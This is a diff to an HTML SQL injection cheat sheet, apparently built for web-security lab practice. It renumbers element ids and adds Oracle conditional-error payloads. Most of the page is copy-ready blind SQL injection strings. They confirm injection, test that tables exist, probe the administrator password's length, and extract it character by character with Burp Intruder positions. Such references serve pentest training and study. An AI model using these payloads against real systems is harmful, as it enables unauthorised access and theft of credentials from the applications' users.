@@ -186,8 +186,8 @@ from other tables.
 </details>
 <details>
 <summary>BLIND ATTACKS TECHNIQUES</summary>
-<p><b>DESCRIPTION:</b> Simple boolean conditions can help to detect how different the site behaves. Look for any 
-new behavior after small changes. Inspect the headers in burpsuite to check if exist something querying the application. 
+<p><b>DESCRIPTION:</b> Simple boolean conditions can help to detect how different the site behaves. Look for any new behavior after small changes. 
+Inspect the headers in burpsuite to check if exist something querying the application. 
 <details>
 <summary>CONDITIONAL RESPONSES</summary>	
 <b>C1: TRUE</b><p id="BAT01"><mark>' AND '1'='1</mark></p>
@@ -210,29 +210,29 @@ To successfully acomplish the blind attack, the boolean conditions can help. It 
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT04')">.C1.</button> 
 
 <u>CHECK THE CHARACTER LENGHT OF THE COLUMN VALUE ?</u>
-<b>C1: </b><p id="BAT06"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a</mark></p>
+<b>C1: </b><p id="BAT05"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a</mark></p>
 <b>SAMPLE: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark>
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT06')">.C1.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT05')">.C1.</button>
 
 <b>NOTE:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
 hits the FALSE statement the lenght is founded.
 <br>
 > <u>CHECK CHARACTERS VALUE USING A METHOD "GREATHER THAN" AND "EQUALS" ?</u>
-<b>C1: </b><p id="BAT11"><mark>' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) > 'value</mark></p>
+<b>C1: </b><p id="BAT06"><mark>' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) > 'value</mark></p>
 <b>SAMPLE: </b><mark>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't</mark>
 
 "first it needs a TRUE/FALSE behavior [blind sqli identified], if true the first character of the value is 
 greather than the value...
 
-<b>C2: </b><p id="BAT12"><mark>' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) = 's</mark></p>
+<b>C2: </b><p id="BAT07"><mark>' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) = 's</mark></p>
 <b>SAMPLE: </b><mark>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's</mark>
 
 ...if TRUE the first character of the value is equals to the value"
 
 <b>NOTE:</b> or "SUBSTR"
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT11')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT12')">.C2.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT07')">.C2.</button>
 <br>
 > <u>CHECK THE CHARACTERS OF THE COLUMN ?</u>
 <b>C1: </b><p id="BAT08"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§</mark></p>
@@ -245,9 +245,9 @@ with each letter, number, etc. For that reason a pre-req is to know the value le
 
 <b><u>CLUSTER BOMB ATTACK !</u></b> - two positions
 
-<b>C1: </b><p id="BAT10"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,<b>§1§</b>,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='<b>§a§</b></mark>
+<b>C1: </b><p id="BAT09"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,<b>§1§</b>,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='<b>§a§</b></mark>
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT10')">.C1.</button></p>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT09')">.C1.</button></p>
 
 <b>NOTE:</b> Remember the TRUE/FALSE logic and the response associated to that. That will help to know which 
 values are correct = TRUE. 
@@ -255,30 +255,61 @@ values are correct = TRUE.
 <details>
 <summary>CONDITIONAL ERRORS</summary>
 
-<b>NOTE:</b> [HTTP/2 500 Internal Server Error], error will act similar to the TRUE/FALSE logic. If error appears, FALSE If not, 
-TRUE. 
+<b>NOTE:</b> [HTTP/2 500 Internal Server Error], error will act similar to the TRUE/FALSE logic. If error appears, FALSE. If not, TRUE. 
 
 > <u>CONFIRM SERVER IS INTERPRETING THE INJECTION AS A SQL QUERY</u><br>
-<b>C1: NON-ORACLE </b><p id="BAT008"><mark>'||(SELECT '')||'</mark></p>
-<b>C2: ORACLE </b><p id="BAT009"><mark>'||(SELECT '' FROM dual)||'</mark></p>
+<b>C1: NON-ORACLE </b><p id="BAT10"><mark>'||(SELECT '')||'</mark></p>
+<b>C2: ORACLE </b><p id="BAT11"><mark>'||(SELECT '' FROM dual)||'</mark></p>
 	
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT008')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT009')">.C2.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT10')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT11')">.C2.</button>
 
 > <u>CONFIRM IF TABLE EXISTS ?</u><br>
-<b>C1: NON-ORACLE </b><p id="BAT010"><mark>'||(SELECT '' FROM TABLE_NAME WHERE ROWNUM = 1)||'</mark></p>
+<b>C1: NON-ORACLE </b><p id="BAT012"><mark>'||(SELECT '' FROM TABLE_NAME WHERE ROWNUM = 1)||'</mark></p>
 <b>SAMPLE: </b><mark>'||(SELECT '' FROM users WHERE ROWNUM = 1)||'</mark>
 
-<b>NOTE:</b> WHERE ROWNUM = 1 prevents break concatenation. If error is present table does not exist, if not you can infer 
-the table exist. 
+<b>NOTE:</b> WHERE ROWNUM = 1 prevents break concatenation. If error is present table does not exist, if not you can infer the table exist. 
 	
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT010')">.C1.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT012')">.C1.</button>
 
 <b>CONDITIONS: </b> 
 
-<b>C1: TRUE = ERROR</b><p id="BAT011"><mark>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</mark></p>
-<b>C2: FALSE = NO ERROR</b><p id="BAT012"><mark>'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</mark></p>
+<b>ORACLE: </b>	
+<b>C1: TRUE = ERROR</b><p id="BAT013"><mark>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</mark></p>
+<b>C2: FALSE = NO ERROR</b><p id="BAT014"><mark>'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'</mark></p>
 
-<b>NOTE: </b> If that's OK, you can trigger an error conditionally on the truth of a specific condition.
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT013')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT014')">.C2.</button>
+	
+<b>NOTE: </b> If that's OK, you can trigger an error conditionally on the truth of a specific condition. Now that you know the query
+is interpreted as SQL query, also, you know that a table exist you can guess users. 
+
+<b>C3: </b><p id="BAT015"><mark>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')||'</mark></p>
+<b>SAMPLE: </b><mark>'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT015')">.C3.</button>
+
+<b>NOTE: </b> Once you have a sql query running, you got a valid user, it is time to try to retrieve the possible password lenght. 
+
+<b>C4: </b><p id="BAT016"><mark>'||(SELECT CASE WHEN LENGTH(COLUMN_NAME)>1 THEN to_char(1/0) ELSE '' END FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')||'</mark></p>
+<b>SAMPLE: </b><mark>'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT016')">.C4.</button>
+
+<b>NOTE: </b> This condition should be true, confirming that the password is greater than 1 character in length. Intruder attack until the error 
+dissapears, meaning the final value is the total lenght. 
+
+<b>SAMPLE: </b><mark>'||(SELECT CASE WHEN LENGTH(password)>2 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</mark>
+<b>SAMPLE: </b><mark>'||(SELECT CASE WHEN LENGTH(password)>6 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'</mark>
+
+<b>NOTE: </b> Once the total length is discovered, the next step is to try to discover the character at each position.
+
+<b>C5: </b><p id="BAT017"><mark>'||(SELECT CASE WHEN SUBSTR(COLUMN_NAME,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')||'</mark></p>
+<b>SAMPLE: </b><mark>'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT017')">.C5.</button>
+
+<b>NOTE: </b> Now it is time of an "INTRUDER" attack to check each position. 
+
+<b>SAMPLE: </b><mark>'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'</mark>
 	
 </details>	
 </p>
